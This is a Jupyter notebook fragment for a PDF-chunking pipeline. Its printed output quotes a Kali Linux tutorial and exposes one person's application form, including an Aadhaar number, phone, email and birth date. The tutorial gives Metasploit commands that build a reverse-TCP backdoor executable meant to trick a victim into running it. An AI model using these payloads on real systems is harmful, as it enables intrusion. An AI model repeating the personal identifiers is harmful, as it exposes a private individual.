with the terminal. In win -\\ndows there is a command prompt from where the \\nwhole system can be assessable, in Linux there \\nis something called as terminal which is a based \\nupon the command line interface from where the \\nwhole system can be viewed. In order to open the \\nterminal just follow the path as – “Applications > \\nAccessories > terminal” and from there you can \\nsimply copy the terminal to the desktop like I did, \\nso that every time the user doesn’t have to go \\nthere, he just come in and click on the terminal to \\naccess it (Figure 4). \\nFigure 1.  The login panel of Kali\\nFigure 2.  The desktop\\nFigure 3.  Showing the Internet connectivity\\nFigure 4. Showing the path to open the terminal\\nFigure 5.  The terminal – a command line interface\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 41}, page_content='Extra 03/2013 42DeFeNSe\\nAnd this is how the terminal looks like (Figure 5).\\nNow let’s get our hands dirty by running some of \\nthe commands in the terminal and let’s get friendly \\nwith the Linux.\\nSome of the important commands which will help \\nthe user to get friendly with Kali:\\n•  In order to run a service in Linux just run \\nservice <name> start . For an instance let’s say \\nI have run a service called apache2 for my lo -\\ncal-host then I will type, “service apache2 \\nstart” (Figure 6). And in order to check wheth -\\ner the service has been successfully started or \\nnot. Just start your Internet browser and write \\n“127.0.0.1” which is a loopback address which shows the successful working of the Apache \\nserver (Figure 7).\\n•  In order to open the Internet browser through \\nthe terminal, just enter “Firefox &” and it will \\nopen the browser and also shows that what ex -\\nactly the PID (process ID) for this browser pro -\\ncess has been allocated (Figure 8). \\n•  If the root wants to change the password of his \\naccount, he can simply do it by entering the \\ncommand, “passwd” and enter the password it \\nwill change the password from default “toor” to \\nsay “123” (Figure 9)\\nTill now we have seen some of the important \\ncommands which make a user friendly with the \\nLinux terminal. Some more commands which are \\nvery helpful for any user to get started with the \\nLinux and those are:\\n•  ls – list the iles and folders of the current di -\\nrectory\\n•  cd – change directory\\n•  touch – to make a ile\\n•  mkdir – to create a directory\\n•  rm – removes the iles, rm -R removes iles \\nand directories\\n•  rmdir – removes the empty directories\\n•  man – open the manual for the commands\\n•  time – to see the current time\\nFigure 6.  Showing to start the apache2 service\\nFigure 7.  Shows Apache is successfully running\\nFigure 10. Exploring the tools\\nFigure 9.  Changing root default password\\nFigure 8.  Showing to open the Firefox browser\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 42}, page_content='www.hakin9.org/en 43KALI LINUX – A Solution to HACKINg/SeCURITY\\n•  date – shows the current \\n•  nano – another editor for the creation and edit -\\ning of the iles.\\nNow these are some of the most important com -\\nmands which will help any user in the further \\nprocess. Now let us just get back to our main \\nmotive but before irst let me make everyone fa -\\nmiliar with some of the terminologies which will \\nhelp everyone to understand the basic concept \\nbehind the scene.\\nNow in order to begin with any kind of hacking \\nevery person has to go through some phases and \\nthose phases are knows as the hacking phases \\nand those are:\\nSteps Performed by Hackers:\\nThere are only five steps in order to hack anything \\nin this world:\\n•  Information Gathering\\n•  Scanning\\n•  Gaining Access\\n•  Maintaining Access\\n•  Covering Tracks\\nIn order to explore more about these hacking \\nsteps let’s just check from where all the tools can \\nbe accessed in GUI interface (Figure 10). \\nNow there are more than 300+ tools in Kali Linux \\nwhich will help to acquire the remote systems, \\ngenerating your own payloads, addition of latest \\nexploits, scanning process and much more. Now \\nit is not possible for me also to explore each and \\nevery tool in the tool list but what I am going to do \\nhere is sticking to the main concept and will going \\nto show the main tools which will make a person \\nfamiliar with the Kali and it will also make them free \\nto use the tools of their own.\\nInformation gathering\\nthe very first step in order to gather each and ev -\\nery information about the target, only then a tes -\\nter can examine the whole bunch of vulnerabili -\\nties and can patch them easily and safely. Now \\nthe major source of gathering the information is \\nGoogle which is an open source and is available \\nfor each person. But the information gathering de -\\npends upon:\\n•  Active gathering- which completely means a \\nuser is interacting with the target directly. For \\nan instance – making a phone call to a friend \\nworking in the target company and gathering \\nthe information by spooing your own friend.•  Passive gathering – in which a user is not di -\\nrectly interacting with the target means collect -\\ning the information from search engines like \\nGoogle or Bing (Figure 11). \\nNow the main task is to gather the IP (Internet \\nProtocol) address which is a 32-bit unique num -\\nber and is being assigned to everyone. The best \\nmethod is to ping a website and gather the IP ad -\\ndress. Although the ping is used for checking the \\nwhether the host is alive or not but here we are \\nquite stick to our own method. So, if your target is \\nFigure 13.  Options in Dmitry\\nFigure 12.  Acquiring the IP address of a particular website\\nFigure 11.  Gathering information from Google\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 43}, page_content='Extra 03/2013 44DeFeNSe\\nwebsite simply ping <website name>  and copy the \\nIP address (Figure 12).\\nNow the next information gather is to check for \\nthe: \\n•  reverse look up\\n•  DNS information\\n•  IP address \\n•  and type of target\\nNow in Kali there is only tool which can give you \\nall these results, and you don’t have your Inter -\\nnet every time to go a website and start search -\\ning for the results. The tool that I am using here is \\n“dmitry” which is completely based on command \\nline but very easy to use and even give the results \\nfaster and accurate.\\nSo in order to use dmitry simply run the following \\ncommand (Figure 13-15):\\n<dmitry –winsepfb –t 0-9 –e IP>\\nNow in this particular scan I have targeted the \\nGoogle and it shows the scan results that all the \\n150 ports are in a closed state. You can simply \\nput as many as options you want.Scanning\\nThe second most important phase to find out the \\nservices that are vulnerable, the open ports, and \\nmany other types of types of services which are \\nvulnerable in windows, websites, routers, and net -\\nworks etc. therefore, scanning is broadly divided \\ninto major three parts:\\n•  Port scanning: In this method the attacker will \\nsend a number of messages to break into the \\ncomputer so that he can get the information \\nabout the computer’s network.\\n•  Network Scanning: To check the number of ac -\\ntive hosts on the network.\\n•  Vulnerability scanning: Means to check the \\nweaknesses in the target so that it attacker us -\\nes those to gain the access of the target\\nSo now I am going to use the universal vulner -\\nability scanner which gives the best output for \\nscanning process and is an open source avail -\\nable freely on the Internet and the tool known is \\nnmap which is responsible a number of inger -\\nprinting, service ingerprinting and numerous \\nTCP scan, stealth scan, UDP scan, PORT scan \\nand many more. \\nFigure 14.  Running Dmitry against Google\\nFigure 17.  TCP scans\\nFigure 16.  Invoking the nmap in the terminal\\nFigure 15.  Results of the Dmitry scan\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 44}, page_content='www.hakin9.org/en 45KALI LINUX – A Solution to HACKINg/SeCURITY\\nStep 1\\nInvoke the nmap by running the command “nmap” \\n(Figure 16).\\nStep 2\\nCheck for TCP SCAN. Command used is: namp \\n-sT IPaddress (Figure 17).\\nexploitation\\nGaining Access or exploitation means to acquire \\nany computer system, control panel of any website \\nor any network without someone’s permission. The \\nattacker in this phase attacks on the systems to \\ngain the access and steals the important informa -\\ntion about the company which he wants to exploit. \\nThe exploit can occur in LAN (Local Area Network), \\nin a WAN (Wide Area Network) and also it can also \\noccur offline like REVERSE ENGINEERING, Buf -\\nfer Overflow Attacks, Password Filtering etc. \\nNow in this particular phase I am going to exploit \\nmy own WIN-7 just to show how the exploitation \\ncan be done through Kali Linux in much faster way \\nthan Backtrack.\\nBefore going deep into the exploitation let me \\nclear some of the basic terminologies so that there \\nshould be no confusion while going through attack -\\ning phase.\\n•  Threat: A threat is potential violation of the se -\\ncurity.\\n•  Vulnerability: It is the weakness in the design of \\nan application or any website that can lead to \\ncompromising with the security of the system or \\nthe network or any web based application.\\n•  Attack: To set up a violence force.\\n•  Exploit: It means to breach the security of the \\nIT (Info. Tech.) System through the vulnerabili -\\nty.\\n•  Payload: Payloads in computer security are re -\\nlated to malicious iles (generally .exe) which \\nperform malicious activity.\\n•  Reverse TCP connection: A reverse connec -\\ntion actually made to bypass the restrictions \\nthat the irewall has applied on the open ports. \\nA irewall actually blocks the incoming trafic \\nthrough the open ports but could not block the \\noutgoing trafic. So, the attacker use this way \\nto bypass the security restrictions.\\nThings Required\\n•  KALI LINUX UPDATED METASPLOIT.\\n•  An intermediate to upload your payload (I am \\nusing DROPBOX and SHARE FOLDER of KA -\\nLI LINUX).Brief Description about the Metasploit\\nMetasploit (also known as MS) is basically an open \\nsource framework that contains all the exploits, \\npayloads, helpful in penetration testing and also \\nhelpful in IDS signature development. MSF actual -\\nly contains the database of the exploit codes which \\nwhen hit on any PC inside or outside the network \\nwith the concerned vulnerabilities, produce a shell \\nat that targeted PC and returns back to the attack -\\ner’s machine.\\nSo, let’s get started with the exploitation phase: \\n•  Open up the terminal and invoke the Metasploit \\nconsole by running the command called \\nmsfconsole  and wait for 1-2 minutes as it takes time \\nto load all the payloads, exploits etc (Figure 18). \\nFigure 20.  Executing the exploit to run\\nFigure 19. Generating a payload for back connection\\nFigure 18. Invoking the Metasploit Terminal\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 45}, page_content='Extra 03/2013 46DeFeNSe\\n•  And in the mean while till the msfconsole gets \\nopened, open up a new terminal to create a \\npayload which will help to create a back con -\\nnection, and in order to create a payload enter \\nthe following command (Figure 19): msfpayload \\nwindows/meterpreter/reverse _ tcp lhost=Kali \\nIP address lport=4444 x > /root/Desktop/\\nbackconnection.exe  \\n•  Now upload it anywhere on the Internet to ex -\\nploit and here I am uploading it in dropbox just \\nfor demonstration.\\n•  Now coming back to the Metasploit console \\nand run the following commands step by step.\\n•  Write the command – use exploit/multi/handler  \\nand press enter” (Figure 20)\\n•  Set a payload by writing the command (Figure \\n21): set payload Windows/vncinject/reverse _ tcp\\n•  Set the LHOST (LOCAL HOST) – set lhost \\n192.168.40.128  (KALI IP address) (Figure 22)\\n•  Then Just set for the exploit – “exploit” (Figure 23)\\n•  Now as soon as The VICTIM download your \\nvulnerable payload ile from the INTERNET \\nyou will get the back connection of his/her PC \\n(Figure 24 and Figure 25)\\nMaintaining Access\\nMaintaining Access is an important phase after \\ngaining the access to any computer system. In \\nthis step the attacker leaves himself an easier way in order to come back to into the system lat -\\ner. By this step of hacking an attacker can come \\nto the gained system anytime even if the service \\nhe exploited is patched. The Metasploit Persis -\\ntent Meterpreter Service is what an attacker usu -\\nally uses, but there’s warning when you use this \\npersistent Meterpreter requires no authentication. \\nBut this will have a problem. Any other attacker \\nwho uses the same service will also have the \\nsame port address to maintain the access which \\nis not a right thing. \\nCovering tracks\\nCovering tracks is a last phase of hacking. Cover -\\ning tracks refers to the actions that are being un -\\ndertaken by an attacker to widen his exploitation of \\nthe system without being detected. Now the rea -\\nson behind covering tracks is to be on the safer \\nside and also include the prolonged stay and con -\\ntinued use of resources. \\nConclusion\\nIn the end I would only like to conclude that in \\nthe depth of crisis, hacking over the INTERNET \\nis still a very big problem. Some hackers do it for \\nthe sake of fun or some do it for the sake of tak -\\ning revenge. Therefore, KALI is the solution of all \\nthese answers. Kali can be used as an OS for \\npenetration testing which could help the security \\nFigure 21.  Executing the payload\\nFigure 24.  Victim tried to install our payload \\nFigure 23.  Setting up the exploit in msfconsole\\nFigure 22.  Setting up the LHOST\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 46}, page_content='KALI LINUX – A Solution to HACKINg/SeCURITY\\nresearchers and analysts to find out the bugs in \\nvarious networks or OS so that they can become \\nsecure to some extent.\\nFigure 25.  Successfully got the Windows Shell on my KALI \\nLINUXDeePANSHU KHANNA\\nLinux Security Researcher, \\nMr. Deepanshu Khanna, a Young Linux Security Expert from \\nLudhiana, Punjab (India), is Linux Security Researcher & Pen -\\netration Tester at “Prediqnous – Cyber Security & IT Intelli -\\ngence”. Currently, he is pursuing his B.Tech. in Computer Sci -\\nence from Lovely Professional University (LPU). He managed \\nWeb Penetration testing, performed network analysis, Exploit \\nmaking, Nessus Complete Security, IDS and Linux Security, \\nwhich leads him to join Prediqnous Team. He has delivered his \\nknowledge through Seminars and Workshops across India. \\nHe gives training to the students for IT Security & Ethical Hack -\\ning. He found and reported many vulnerabilities and phishing \\nscams to IT Dept. of India. He aims to get applauses from oth -\\ner experts of IT industry for his research work on IT Security.\\nEmail: khannadeepanshu34@yahoo.in\\nMobile Number: +91-9779903383\\nadvertisement'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 47}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 48}, page_content='IN SOME CASES\\nnipper studio\\nHAS VIRTUALLY\\nREMOVED\\nMANUAL AUDIT\\nCISCO SYSTEMS INC.theNEED FOR a\\nTitania’s award winning Nipper Studio coniguration \\nauditing tool is helping security consultants and end-\\nuser organizations worldwide improve their network \\nsecurity. Its reports are more detailed than those typically \\nproduced by scanners, enabling you to maintain a higher \\nlevel of vulnerability analysis in the intervals between \\npenetration tests. \\nNow used in over 45 countries, Nipper Studio provides a \\nthorough, fast & cost effective way to securely audit over \\n100 different types of network device. The NSA, FBI, DoD \\n& U.S. Treasury already use it, so why not try it for free at \\nwww.titania.com\\nwww.titania.com\\nUPDA TE\\nNOW WITH\\nSTIG\\nAUDITING'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 49}, page_content='Creating Innovative and Unique QR Code Solutions\\nis our only job and its what we do better than anyone else.\\nIt isn’t about the code, its about what the code can do for you, and \\nit goes so much further than just a marketing idea.  VitreoQR has a \\ncomplete array of world class solutions, from marketing to \\nmanagement, that can help you measure and grow your business. \\nWhatever your challenge might be, inventory control, counterfeit \\nprevention, access control systems, supply chain management or \\nany one of countless other business conditions, VitreoQR can \\ndevelop a QR Code driven solution to meet your speciÞc needs. As \\na licensee of DENSO Wave QR Code patents, we have all the \\nnecessary tools to make your business more efÞcient and more \\nproÞtable through new ideas in 2D barcoding systems.\\nQRCode QRPhoto QRLogo QRMotion QRAnalytics QRCustom SQRC\\nVitreoQR, LLC\\n12801 Berea Road, Suite F\\nCleveland, Ohio 44111 U.S.A.\\nP. 440.941.2320\\nE. info@vitreoqr.com\\nW. http://vitreoqr.comExplore the possibilities that QR Code technologies offer as real world solutions to even the most \\ndifÞcult problems. Convey information, manage issues, reach new markets and move more \\npeople into your perspective as you have never been able to do before. There simply isnÕt \\nanother technology that can do as much for you, at the same value proposition, as a QR Code. \\nVitreoQR deploys genuine, DENSO Wave QR Codes that are absolutely guaranteed to be fully \\ncompliant with the ISO:18004:2006 speciÞcation, delivering to you security and peace of mind.\\nIn Partnership With\\nQR Code® is a Registered Trademark of DENSO WAVE INCORPORATED.No one understands QR Codes like we do. WARNING: If you donÕt want to learn \\nmore, don’t scan this code!\\nINVENTOR OF\\nTHE QR CODE ®®\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/06-5715.pdf', 'page': 0}, page_content='If you’re like most people, you may think of heart \\ndisease as a problem for other folks. If you’re a \\nwoman, you may believe that being female protects you from heart disease. \\nIf you’re a man, you may \\nbelieve you’re not old enough to have a serious heart condition. Wrong on all counts. \\nHeart disease is the #1 killer in the United States—of both men and women. \\nIt affects many people at midlife \\nas well as in old age. African Americans and Latinos are at especially high risk for heart disease and have high rates of some of the risk factors that lead to heart disease. \\nThe good news is that heart disease is preventable. \\nY\\nou can take action to reduce your risk of heart \\ndisease by focusing on your lifestyle and habits. This fact sheet gives you steps you can take to protect your heart health. And what’s good for you, is good for your whole family. As an adult, you can make lifestyle changes that can set a good example for children who may have already developed habits that can lead to heart disease. \\nWhat Is Heart Disease? \\nCoronary heart disease—often simply called heart disease—occurs when the arteries that supply blood to the heart muscle become hardened and narrowed due to a buildup of plaque on the inner walls of the arteries. A heart attack occurs when the plaque in an artery bursts and a clot forms over the plaque, blocking flow through the artery and preventing oxygen and nutrients from getting to the heart. Heart disease is a lifelong condition. Once you get it, you’ll always have it. \\nBut there is much you can do to \\ncontrol the risk factors for heart disease, prevent a heart attack, and increase your chances for a long and vital life. \\nRisk Factors \\nRisk factors are health conditions or habits that increase the chances of developing a disease or having it worsen. For heart disease, there are some risk factors that you can’t change, but many that you can. You can’t change a family history of early heart disease or your age, which for women becomes a risk factor at age 55. Men are at higher risk beginning at age 45. \\nEvery risk factor counts, and if you have more than \\none, they can “gang up” and worsen each other’\\ns \\neffects. But most risk factors can be controlled with changes in lifestyle. Sometimes medication is also needed. Here’s a quick review of these risk factors. \\nSmoking. Smoking leads to reduced blood flow in the \\narteries. \\nThis reduced flow can lead to a heart attack. \\nThere’s no safe way to smoke. However, the benefits of \\nquitting start immediately. After a few days, your blood pressure will drop and the levels of oxygen and carbon monoxide in the blood can return to normal. Just 1 year after quitting, your heart disease risk will drop by more than half. It’s not easy to quit, but make a plan and you can do it. Or try an organized program or medication—ask your doctor if either is right for you. \\nHigh blood pressure. Also called hypertension, high \\nblood pressure increases your risk of heart disease, stroke, and congestive heart failure. \\nEven levels slightly \\nabove normal—called prehypertension—increase your heart disease risk. \\nA Healthy Heart IN BRIEF: \\nYour Guide to \\nU.S. DEPARTMENT OF HEALTH AND HUMAN SERVICES \\nNational Institutes of Health \\nNational Heart, Lung, and Blood Institute \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/06-5715.pdf', 'page': 1}, page_content='There are several ways to get your blood pressure under \\ncontrol. Follow a heart healthy eating plan, r educe \\nyour salt and sodium intake, get regular physical activity, \\nand maintain a healthy weight. If you drink alcoholic \\nbeverages, do so in moderation—one drink per day for \\nwomen and two per day for men. Your doctor may also \\nrecommend medication to lower your blood pressure. \\nHigh blood cholesterol. Excess cholesterol and fat in your \\nblood build up in the walls of the vessels that supply \\nblood to the heart. \\nThis buildup, called plaque, can lead \\nto blockages. A lipoprotein profile tests your levels of \\ntotal cholesterol, low-density lipoprotein (LDL) or “bad” \\ncholesterol, high-density lipoprotein (HDL) or “good” \\ncholesterol, and triglycerides—a fatty substance in the blood. \\nYou can lower your cholesterol by following a heart \\nhealthy eating plan, being physically active, maintaining \\na healthy weight, and, if needed, taking medication. \\nOverweight/obesity. The high rate of overweight and \\nobesity in our country is no secret. \\nBut size isn’t the \\nonly issue. Excess weight can increase the risk of not \\nonly heart disease, but a host of other conditions, such \\nas stroke, gallbladder disease, arthritis, and some can -\\ncers. Even a small amount of weight loss (10 percent of \\nyour initial weight) will help lower your heart disease \\nrisk. \\nIf you are overweight, at the very least, try not to \\ngain more weight. Lasting weight loss requires a change in lifestyle. Adopt \\na healthy\\n, lower calorie eating plan, and be more \\nphysically active. Aim to lose no more than 1/2 pound \\nto 2 pounds per week. If you have a lot of weight to \\nlose, ask your doctor, a registered dietitian, or a \\nqualified nutritionist to help. \\nPhysical inactivity. Even if you have no other risk \\nfactors, being physically inactive greatly boosts your \\nchances of developing heart-related problems. \\nBut \\nnearly 40 percent of Americans do no spare-time \\nphysical activity at all. \\nTry to do at least 30 minutes of moderate-intensity \\nphysical activity on most, if not all, days of the week. \\nThis includes brisk walking, light weightlifting, or even \\nhousecleaning or gardening. \\nIf you need to, divide the 30 \\nminutes into shorter periods of at least 10 minutes each. \\nDiabetes. About 11 million Americans have been \\ndiagnosed with diabetes—and another 5.7 million don’\\nt \\nknow they have it. About two-thirds of those with \\ndiabetes die of heart or blood vessel disease. \\nDiabetes can be detected with a blood sugar test. If you \\nhave diabetes, it is vital that you keep it under control. \\nModest changes in diet and level of physical activity \\ncan often prevent or delay the development of diabetes. \\nTaking Action \\nThe first step to improving your heart health is learning \\nabout your risk profile. See the box “Questions To Ask \\nYour Doctor.” Then begin taking the steps to heart \\nhealth—don’t smoke, follow a heart healthy eating \\nplan, be physically active, and maintain a healthy \\nweight. Start today to keep your heart strong. \\nTo Learn More \\nContact the National Heart, Lung, and Blood Institute \\n(NHLBI) for information and publications on heart \\ndisease and heart health. \\nNHLBI Health Information Center \\nP.O. Box 30105 \\nBethesda, MD 20824-0105 \\nPhone: 301–592–8573 \\nTTY: 240–629–3255 \\nFax: 301–592–8563 \\nwww.nhlbi.nih.gov 1. What is my risk for heart disease? \\n2. What is my blood pressure? What does it mean \\nfor me and what do I need to do about it?\\n \\n3. What are my cholesterol numbers? (These include  \\ntotal cholesterol, LDL, HDL, and triglycerides— \\na type of fat found in the blood and food.) What \\ndo they mean for me and what do I need to do \\nabout them? \\n4. What are my body mass index (BMI) and waist \\nmeasur\\nement? Do they mean that I need to lose \\nweight for my health? \\n5. What is my blood sugar level, and does it mean \\nthat I’m at risk for diabetes?\\n If so, what do \\nI need to do about it? \\n6. What other screening tests do I need to help \\npr\\notect my heart? \\n7. What can you do to help me quit smoking? \\n8. How much physical activity do I need to help \\npr\\notect my heart? \\n9. What’s a heart healthy eating plan for me? \\nHow can I tell if I’m having a heart attack? If I \\nthink I’m having one, what should I do?\\n Questions To Ask \\nYour Doctor \\n10. \\nU.S. DEPARTMENT OF HEALTH AND HUMAN SERVICES \\nNational Institutes of Health \\nNational Heart, Lung, and Blood Institute \\nNIH Publication No. 06–5715 \\n')]"
            ]
          },
          "metadata": {},
          "execution_count": 9
        }
      ],
      "source": [
        "docs"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Z_A2nX3-Ptgl"
      },
      "source": [
        "## Text Splitting - Chunking"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 10,
      "metadata": {
        "id": "Bouw0M5ANVqL"
      },
      "outputs": [],
      "source": [
        "text_splitter = RecursiveCharacterTextSplitter(chunk_size=300, chunk_overlap=50)\n",
        "chunks = text_splitter.split_documents(docs)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 11,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "TfDphk1rrM0A",
        "outputId": "4a0a4175-9502-478c-eb2d-9e0e29882cc7"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "573"
            ]
          },
          "metadata": {},
          "execution_count": 11
        }
      ],
      "source": [
        "len(chunks)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 12,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Fsc6K_Z3NnhT",
        "outputId": "02eb7635-8388-406e-e440-1e4a77a0e3dc"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 0}, page_content=\"1.\\nName (As per SSC / Equivalent certificate)\\n:\\nSUNNAM SEETHARAM\\n2.\\nFather's/ Husband's Name\\n:\\nS VEERRAJU\\nPreserve the REGISTRATION NUMBER \\nfor all your future correspondence.\\n3.\\nMother's Name\\n:\\nS SUBHADRA\\n4.\\nGender\\n:\\nMale\\n5.\\nDate of Birth\\n(As per SSC/Equivalent certificate)\\n:\\n16-08-1996\\n4159216\\n6.\")"
            ]
          },
          "metadata": {},
          "execution_count": 12
        }
      ],
      "source": [
        "chunks[0]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 13,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "jenEDd6hN7Cn",
        "outputId": "a343205b-ef46-4361-cf6b-1dccc4ea7cd9"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 0}, page_content=':\\n16-08-1996\\n4159216\\n6.\\n(a) SSC/Equivalent Roll No.\\n:\\n1111127157\\n(b) Year of Passing\\n:\\n2011\\n11.\\n7.\\nUpload Certificate (SSC or Equivalent)\\n:\\nUploaded\\n8.\\nEducational Qualification\\n:\\nIntermediate  / Any other \\nequivalent\\n9.\\nCommunity\\n:\\nABO-ST\\n10.\\nUpload Community Certificate\\n(For BC, SC and ST)\\n:')"
            ]
          },
          "metadata": {},
          "execution_count": 13
        }
      ],
      "source": [
        "chunks[1]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 14,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xLh3j6guOTLY",
        "outputId": "8e4d07d9-2644-4340-edf9-e9f7a4b9f711"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 0}, page_content='(For BC, SC and ST)\\n:\\nUploaded\\n13.\\nDo you belong to EWS Category ?\\n:\\nNo\\n14.\\nUpload EWS Certificate\\n(For OC)\\n:\\n---\\n15.\\nDo you belong to Ex-Servicemen ?\\n:\\nNo\\nEx-Servicemen Joining Date\\n:\\n---\\nEx-Servicemen Discharge Date / Likely Date \\nof Discharge\\n:\\n---\\n16.\\nldentificaton Marks')"
            ]
          },
          "metadata": {},
          "execution_count": 14
        }
      ],
      "source": [
        "chunks[2]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 15,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "B-lh4cUSO5EH",
        "outputId": "8c2e9d38-b27f-4cdc-f4b7-460b0833321f"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 0}, page_content='of Discharge\\n:\\n---\\n16.\\nldentificaton Marks\\n(As per SSC / Equivalent certificate)\\n:\\nA MOLE ON THE LEFT SIDE OF \\nTHE CHEST\\n:\\nA MOLE ON THE RIGHT SIDE OF \\nTHE RIBBS\\n17.\\nMobile No.\\n:\\n8688655324\\n12.\\n18.\\nE-mail id\\n:\\nbtgsuryacomputers@gmail.c\\nom\\n19.\\n(a) Do you have Aadhaar Card ?\\n:\\nYes')"
            ]
          },
          "metadata": {},
          "execution_count": 15
        }
      ],
      "source": [
        "chunks[3]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 16,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_eZw3iXPPlGs",
        "outputId": "44005928-2cdd-462f-ccfe-c15d54f6faba"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 0}, page_content='om\\n19.\\n(a) Do you have Aadhaar Card ?\\n:\\nYes\\n(b) lf yes, please mention number\\n:\\n673915750575\\n20.\\nWhat is your preferred medium\\nof Examination ?\\n:\\nTelugu\\n21.\\nWhich is your prefered place for \\nwriting Preliminary written test ?\\n(SLPRB, AP reserves the Right to \\ninclude New Test Centres, if')"
            ]
          },
          "metadata": {},
          "execution_count": 16
        }
      ],
      "source": [
        "chunks[4]"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "wxL78Mn0P3N2"
      },
      "source": [
        "## Embeddings"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 17,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 458,
          "referenced_widgets": [
            "debd2f92e22a44df8943132e671636b4",
            "7dc1e04e325e42999eb85aeb3837a815",
            "b26e563565ab49b98c8e820da11745d6",
            "f96ce438c52248448657762249655156",
            "e508ab07486c4a468013b088b82bfe4d",
            "84df3844b1814a17a2f808adfaf46824",
            "f2a65b6f3488479b8f8b27f1cabbff2c",
            "8b51ab50ad9c4b8da0288206a3d2fa7e",
            "fcfc1529a5d3418b9836a62d0fc106aa",
            "fef58aea1e2e494aa2010625513e66eb",
            "91ee126b22e74615adce362158e8c3a2",
            "082f318c5fbd484380d8236dc45f9113",
            "4390291fb8c84d1b811b684c1bae6b64",
            "0a3ab5e4c5f54b37abb04c69364ecafa",
            "0d2a4c2dd3bd47969b06bedf0ff5a112",
            "0dc90dc4aedf4c74add67ed612d7f7e3",
            "fde861780f5840b096cd6b358a3b1988",
            "48e0352f24124042ab5ad43d8c056063",
            "3587481345634b9cbd471d4ee9688c31",
            "f4dc7353f04b48f0bcb2a48f98416ca3",
            "f0c3e17605c64e79aa8a61ff39d2f2db",
            "69bb95eda11841afb90fce6286de88d4",
            "64f7adbbb81f4b94b58a00bab4b866bf",
            "407b99f6e5304dc5bb688f9370712678",
            "243bee62fa9f4633a6bf1b254d9f19b8",
            "af5733b030124f84875b1d9c80a3f0a6",
            "4d16a9e59a4a4b04b3fffe0b8c6d7a39",
            "0c43d0c9bb134a8785a22d90c012b82d",
            "ea6f2caf48bc4c13bdf255888cde9083",
            "585f0fd45aed4782baf5705339ca93a8",
            "beb269af7ced4d96aeb5f036302fed93",
            "202df67bfca5470da5e8d543a47767d6",
            "9c5ddf53a9684ca389940d01fcc1771d",
            "33338f5796c74c78a5e065990afe3164",
            "10dd3c6ddffe457ab0418bfdecdbf014",
            "44575aee07aa45b386dfd3ec0758e8b8",
            "b294841dbb5f4188ab77b52c7e2fea54",
            "59697ac31e3147a19fba4294710c0fa4",
            "832832b4eeb74a25bd42ac65e5046fb9",
            "38edb409799d4846a46fe96ae78be230",
            "767f043e81e54fb0b8ddad17e2d9171c",
            "9e66ce61e8d34596af44e81a46e11d1c",
            "422e1b275ccc43e592ea1b58157eb4a0",
            "e163545b5daf4f5ab65c5bb8c430d1a3",
            "d97a4d7559264300b86579dc5b0e93d5",
            "779f374d3b6c465cbd111fa7f1dda23c",
            "714b30036dbd456fa24447883bbe97a6",
            "004529c3d3fd4b69af6d040256d5e32f",
            "05de48d435b44a9fb8c42a143fdfb3a4",
            "71c5d900e7dc4d40b71d9360a82dbb79",
            "a49ca3ce87c94f76b4b3562ff1a69303",
            "e2b1344ab98e406d8a5a65baa4781760",
            "09692a947fb24783a3050d4283e411c2",
            "5b6f9fa8709448608c9998af01b4a4ad",
            "81965926fc02496fa8300a6283316b5e",
            "d43667173bb5433b8d7bc06e294391c0",
            "a3337f396826424dac95b6ab489fc32a",
            "589f1dc9975d46fbbc4d8040986d7028",
